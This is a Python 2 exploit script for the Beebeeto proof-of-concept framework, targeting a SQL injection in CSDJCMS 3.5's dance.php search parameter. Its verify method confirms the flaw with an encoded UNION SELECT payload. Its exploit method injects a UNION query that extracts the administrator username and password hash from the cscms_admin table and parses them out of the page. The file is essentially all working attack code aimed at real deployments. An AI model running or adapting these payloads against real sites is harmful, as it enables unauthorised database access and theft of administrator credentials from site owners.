#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0123',
            'name': 'CSDJCMS 3.5 /app/controllers/dance.php SQL注入漏洞 POC & Exploit',
            'author': '大孩小孩',
            'create_date': '2014-10-28',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'CSDJCMS',
            'vul_version': ['3.5'],
            'type': 'SQL Injection',
            'tag': ['CSDJCMS漏洞', 'SQL注入漏洞', '/app/controllers/dance.php', 'php'],
            'desc': 'CSDJCMS 3.5 app/controllers/dance.php文件存在SQL注入漏洞。',
            'references': ['http://www.wooyun.org/bugs/wooyun-2014-059088',
            ],
        },
    }

    @classmethod
    def verify(cls, args):
        payload = ("/index.php/dance/so/key/?key=%252527)%20%2561%256E%2564%201=2%20union%20%2573"
                   "%2565%256C%2565%2563%2574%201,md5(4684894),3,4,5,6,7,8,9,10,11,12,13,14,15,16,"
                   "17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42%20%23")
        verify_url = args['options']['target'] + payload
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        request = urllib2.Request(verify_url)
        response = urllib2.urlopen(request)
        content = response.read()
        if '904c23abadd5a4648a973c86385f3930' in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args

    @classmethod
    def exploit(cls, args):
        vul_url = args['options']['target']
        payload = ("/index.php/dance/so/key/?key=%252527)%20%2561%256E%2564%201=2%20union%20%2573"
                  "%2565%256C%2565%2563%2574%201,concat(CS_AdminName,0x3a,CS_AdminPass),3,4,5,6,"
                  "7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,"
                  "34,35,36,37,38,39,40,41,42%20from%20cscms_admin%23")
        if args['options']['verbose']:
            print '[*] Request URL: ' + vul_url + payload
        request = urllib2.Request(vul_url + payload)
        response = urllib2.urlopen(request)
        content = response.read()
        pattern = re.compile(r'.*?<a[^>]*?>(?P<username>[^<>]*?):(?P<password>[^<>]*?)</a>',re.I|re.S)
        match = pattern.match(content)
        if match == None:
            args['success'] = False
            return args
        else:
            username = match.group('username').strip()
            password = match.group('password').strip()
            args['success'] = True
            args['poc_ret']['vul_url'] = vul_url
            args['poc_ret']['Username'] = username
            args['poc_ret']['Password'] = password
            return args


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())